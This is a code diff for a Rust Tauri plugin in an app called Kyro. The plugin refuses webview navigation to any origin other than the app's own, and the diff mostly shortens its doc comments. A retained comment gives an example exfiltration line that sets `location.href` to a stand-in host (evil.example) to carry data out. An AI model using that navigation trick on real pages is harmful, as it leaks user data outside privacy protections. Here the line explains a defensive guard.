@@ -1,11 +1,8 @@
 //! Navigation guard: the webview may only ever show Kyro's own pages.
 //!
-//! The CSP blocks `fetch`/XHR to other hosts, but not a top-level navigation: a compromised
-//! page could run `location.href = "https://evil.example/?d=…"` and the data would leave in
-//! clear, outside Tor and outside `net_fetch`'s allowlist. This plugin refuses every
-//! navigation that is not to the app's own origin (`tauri://localhost` on macOS/Linux,
-//! `http(s)://tauri.localhost` on Windows, plus the dev server in debug builds), and the main
-//! window refuses every `window.open` (see `lib.rs`).
+//! The CSP blocks `fetch`/XHR to other hosts, but not a top-level navigation: a compromised page
+//! could run `location.href = "https://evil.example/?d=…"` and the data would leave in clear,
+//! outside Tor and outside `net_fetch`'s allowlist.
 
 use tauri::plugin::{Builder, TauriPlugin};
 use tauri::{Runtime, Url};
@@ -25,8 +22,7 @@ pub fn is_app_url(url: &Url, dev: Option<&Url>) -> bool {
     }
 }
 
-/// The plugin, checked for every navigation of every webview. `dev` = `build.devUrl`, only
-/// honoured in debug builds.
+/// The plugin, checked for every navigation of every webview.
 pub fn init<R: Runtime>(dev: Option<Url>) -> TauriPlugin<R> {
     let dev = if cfg!(debug_assertions) { dev } else { None };
     Builder::new("kyro-nav-guard")
@@ -68,7 +64,6 @@ mod tests {
         ] {
             assert!(!is_app_url(&u(bad), None), "{bad}");
         }
-        // Dev server: exact origin only.
         let dev = u("http://localhost:1420");
         assert!(is_app_url(
             &u("http://localhost:1420/src/main.tsx"),
